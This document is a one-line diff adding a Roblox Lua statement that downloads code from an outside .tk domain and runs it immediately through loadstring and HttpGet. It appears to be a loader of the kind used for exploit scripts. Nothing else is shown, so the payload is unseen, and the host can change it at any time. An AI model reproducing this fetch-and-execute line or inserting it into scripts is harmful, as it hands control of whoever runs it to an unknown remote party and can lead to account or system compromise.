@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://srilol.tk/kmtsp.html"))()
